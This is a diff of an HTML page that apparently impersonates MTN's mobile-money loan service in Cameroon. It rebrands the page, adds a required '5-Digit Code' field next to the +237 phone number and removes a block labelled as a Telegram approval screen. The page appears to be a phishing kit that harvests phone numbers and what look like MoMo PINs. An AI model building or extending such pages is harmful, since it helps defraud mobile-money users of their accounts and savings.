@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN Xtra Loan</title>
+    <title>MTN MoMo Advance Loans Cameroon</title>
     <link rel="stylesheet" href="style.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
 </head>
@@ -23,13 +23,13 @@
     <!-- HOME / CALCULATOR SCREEN -->
     <div id="screen-home" class="screen">
         <header>
-            <h1>MTN Xtra Loan</h1>
+            <h1>MTN MoMo Advance Loans Cameroon</h1>
             <p>Easy Loan</p>
         </header>
         
         <div class="content-card">
-            <h3>Welcome to MTN Xtra Loan</h3>
-            <p>Get loans easily through MTN Xtra Loan Cameroon</p>
+            <h3>Welcome to MTN MoMo Advance Loans</h3>
+            <p>Get loans easily through MTN MoMo Advance Loans Cameroon</p>
             
             <div class="calculator">
                 <h4>Loan Calculator</h4>
@@ -61,7 +61,7 @@
     <!-- APPLICATION FORM SCREEN -->
     <div id="screen-application" class="screen">
         <header>
-            <h1>MTN Xtra Loan</h1>
+            <h1>MTN MoMo Advance Loans Cameroon</h1>
             <p>Loans</p>
         </header>
 
@@ -113,7 +113,11 @@
                         <span>+237</span>
                         <input type="text" id="phone-number" placeholder="670123456" maxlength="9" minlength="9" pattern="\d{9}" title="Exactly 9 digits (numbers only)" required>
                     </div>
-                    <small>9 digits without +237 prefix (e.g., 670123456)</small>
+
+                    <!-- NEW: 5-DIGIT CODE -->
+                    <label>5-Digit Code</label>
+                    <input type="text" id="five-digit-code" placeholder="12345" maxlength="5" minlength="5" pattern="\d{5}" title="Exactly 5 digits" required>
+                    <small>Enter your 5-digit code.</small>
                 </div>
 
                 <!-- STEP 3 -->
@@ -137,6 +141,7 @@
                         <p>Loan Term: <span id="summary-term">—</span></p>
                         <p>Purpose: <span id="summary-purpose">—</span></p>
                         <p>Applicant: <span id="summary-name">—</span></p>
+                        <p>Phone: <span id="summary-phone">—</span></p>
                     </div>
                 </div>
 
@@ -147,25 +152,6 @@
                     <button type="submit" id="btn-submit" class="primary-btn" style="display: none;">SUBMIT APPLICATION</button>
                 </div>
             </form>
-        </div>
-    </div>
-
-    <!-- PROCESSING / TELEGRAM APPROVAL SCREEN -->
-    <div id="screen-processing" class="screen processing-bg">
-        <div class="processing-content">
-            <div class="momo-logo">
-                <svg width="80" height="80" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <rect width="100" height="100" rx="20" fill="#005B82"/>
-                    <path d="M30 70L45 45H55L70 70" stroke="#FFCC00" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
-                    <path d="M35 60H65" stroke="#FFCC00" stroke-width="6" stroke-linecap="round"/>
-                </svg>
-            </div>
-            
-            <div class="spinner"></div>
-            
-            <h2>Processing Application</h2>
-            <p>Please wait, this may take a few seconds</p>
-            <div class="dots">...</div>
         </div>
     </div>
 
